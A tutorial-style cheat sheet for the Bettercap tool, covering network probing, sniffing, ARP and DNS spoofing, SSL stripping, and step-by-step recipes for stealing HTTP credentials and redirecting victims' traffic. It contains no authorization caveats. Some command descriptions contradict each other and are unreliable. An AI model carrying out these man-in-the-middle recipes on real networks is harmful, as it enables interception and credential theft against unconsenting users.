
Bettercap is an incredibly powerful, flexible, and comprehensive tool designed for various types of network analysis, monitoring, and attacks. In this guide, I will walk through additional key features, commands, and usage examples of Bettercap, including ARP spoofing, DNS spoofing, HTTP proxy attacks, and more.

---

### **Basic Bettercap Commands**

1. **Starting Bettercap**:
   ```bash
   sudo bettercap
   ```
   - **Explanation**: Starts Bettercap with root privileges. You must use root privileges since Bettercap needs low-level access to the network.

2. **List Available Commands**:
   ```bash
   help
   ```
   - **Explanation**: Displays a list of all available commands and modules within Bettercap.

3. **Show Modules for Specific Attacks**:
   ```bash
   help <module_name>
   ```
   - **Example**:
     ```bash
     help net.probe
     ```
   - **Explanation**: Shows the detailed help for the specific module, explaining its usage, parameters, and options.

---

### **Network Interface and Configuration Commands**

1. **List Available Network Interfaces**:
   ```bash
   net.show
   ```
   - **Explanation**: Shows all available network interfaces on your system, which you can use for attacks or monitoring.

2. **Set the Network Interface**:
   ```bash
   set net.interface <interface_name>
   ```
   - **Example**:
     ```bash
     set net.interface eth0
     ```
   - **Explanation**: Sets the desired network interface for Bettercap to operate on. Replace `<interface_name>` with the appropriate interface (e.g., `eth0`, `wlan0`).

3. **Show Network Information**:
   ```bash
   net.recon on
   net.show
   ```
   - **Explanation**: `net.recon on` turns on network reconnaissance mode, which passively captures information about the network and shows it using the `net.show` command.

---

### **Network Scanning and Host Discovery**

1. **Enable Network Probing**:
   ```bash
   net.probe on
   ```
   - **Explanation**: Sends probe packets to actively discover devices on the network.

2. **Show Discovered Hosts**:
   ```bash
   net.show
   ```
   - **Explanation**: Displays a list of hosts discovered on the network, including their IP addresses, MAC addresses, and vendor information.

3. **Start Network Reconnaissance**:
   ```bash
   net.recon on
   ```
   - **Explanation**: Passively listens to the network traffic to gather information on the hosts connected without sending probe packets.

4. **Disable Network Probing**:
   ```bash
   net.probe off
   ```

---

### **ARP Spoofing for MITM Attack**

ARP spoofing (ARP cache poisoning) allows an attacker to impersonate another device on the network, such as the router, by sending forged ARP packets. This enables a Man-in-the-Middle (MITM) attack where all traffic between the victim and the router is intercepted.

1. **Enable ARP Spoofing**:
   ```bash
   set arp.spoof.targets <target_ip>
   set arp.spoof.fullduplex true
   arp.spoof on
   ```
   - **Explanation**: 
     - `arp.spoof.targets <target_ip>`: Defines the target device you want to spoof (e.g., `192.168.1.10`).
     - `arp.spoof.fullduplex true`: Enables full-duplex mode, meaning both the victim and the gateway will be spoofed.
     - `arp.spoof on`: Starts the ARP spoofing attack.

2. **Disable ARP Spoofing**:
   ```bash
   arp.spoof off
   ```
   - **Explanation**: Stops ARP spoofing and restores the network to its original state.

---

### **Sniffing Network Traffic**

Network sniffing involves capturing network traffic that flows between devices. Bettercap allows you to intercept and log this traffic.

1. **Start Local Network Sniffing**:
   ```bash
   set net.sniff.local true
   net.sniff on
   ```
   - **Explanation**: 
     - `net.sniff.local true`: Enables local traffic capture.
     - `net.sniff on`: Starts capturing and displaying network packets (HTTP, DNS, etc.).

2. **Save Sniffed Data to a File**:
   ```bash
   set net.sniff.output /path/to/save/file.pcap
   ```
   - **Explanation**: Saves all captured traffic in a `.pcap` file format, which can later be analyzed using tools like **Wireshark**.

---

### **DNS Spoofing**

DNS spoofing (DNS cache poisoning) tricks the victim into visiting malicious websites by providing incorrect DNS responses. This can be used to redirect users to phishing sites or to block certain domains.

1. **Enable DNS Spoofing**:
   ```bash
   set dns.spoof.domains <domain>
   dns.spoof on
   ```
   - **Explanation**:
     - `set dns.spoof.domains <domain>`: Specifies the domain you want to spoof (e.g., `facebook.com`). Multiple domains can be comma-separated.
     - `dns.spoof on`: Starts DNS spoofing for the specified domain(s).

2. **Disable DNS Spoofing**:
   ```bash
   dns.spoof off
   ```
   - **Explanation**: Stops DNS spoofing.

---

### **HTTP Proxy and HTTPS Downgrade**

Bettercap can intercept HTTP traffic and downgrade HTTPS traffic to HTTP, allowing attackers to view and manipulate data in plain text.

1. **Enable HTTP Proxy**:
   ```bash
   http.proxy on
   ```
   - **Explanation**: Activates an HTTP proxy to intercept and manipulate HTTP traffic.

2. **Set Up HTTPS Downgrade**:
   ```bash
   set https.proxy.sslstrip true
   https.proxy on
   ```
   - **Explanation**:
     - `https.proxy.sslstrip true`: Enables SSL stripping, which forces HTTPS requests to downgrade to HTTP.
     - `https.proxy on`: Starts the HTTPS proxy for interception.

3. **Stop HTTP/HTTPS Proxy**:
   ```bash
   https.proxy off
   http.proxy off
   ```

---

### **Module Control**

Bettercap operates with several modules, each focusing on different types of attacks, monitoring, and traffic manipulation. Modules can be controlled with `help`, `show`, and `set` commands.

1. **Show Active Modules**:
   ```bash
   show modules
   ```
   - **Explanation**: Lists all the active and available modules you can use.

2. **Configure a Module**:
   ```bash
   set <module_name> <value>
   ```
   - **Example**:
     ```bash
     set net.sniff.output /home/user/capture.pcap
     ```
   - **Explanation**: Sets a specific parameter for a module (e.g., changing output location for traffic sniffing).

---

### **Common MITM Attacks**

#### **1. HTTP Credentials Stealing**
By combining ARP spoofing and HTTP sniffing, you can steal unencrypted HTTP credentials.

- **Steps**:
  1. Start ARP spoofing:
     ```bash
     set arp.spoof.targets <target_ip>
     arp.spoof on
     ```
  2. Start network sniffing:
     ```bash
     net.sniff on
     ```
  3. Capture and analyze HTTP credentials passed through unencrypted HTTP traffic.

#### **2. HTTPS Downgrade Attack**
This attack forces HTTPS traffic (encrypted) to downgrade to HTTP (unencrypted), allowing you to view sensitive data like login credentials.

- **Steps**:
  1. Enable ARP spoofing as usual.
  2. Turn on SSL stripping:
     ```bash
     set https.proxy.sslstrip true
     https.proxy on
     ```

#### **3. DNS Spoofing to Redirect Traffic**
DNS spoofing can redirect the target’s traffic to a malicious website.

- **Steps**:
  1. Start ARP spoofing:
     ```bash
     set arp.spoof.targets <target_ip>
     arp.spoof on
     ```
  2. Enable DNS spoofing:
     ```bash
     set dns.spoof.domains <targeted_domain>
     dns.spoof on
     ```

---

### **Advanced Features**

1. **Custom Scripts**:
   Bettercap supports custom scripts that allow you to automate or chain multiple tasks together. You can write and run a script file using:
   ```bash
   sudo bettercap -eval "events.stream off; net.probe on; sleep 5; arp.spoof on"
   ```

2. **Session Saving**:
   You can save your current Bettercap session and restore it later:
   ```bash
   session.save <filename>
   session.restore <filename>
   ```

---

### **Miscellaneous Commands**

1. **Show the Current Configuration**:
   ```bash
   show
   ```
   - **Explanation**: Displays the current settings and active modules.

2. **Reset the Current Configuration**:
   ```bash
   clear
   ```
   - **Explanation**: Resets all module settings to default.

3. **Quit Bettercap**:
   ```bash
   exit
   ```
   - **Explanation**: Exits the Bettercap console and stops all active attacks.

---
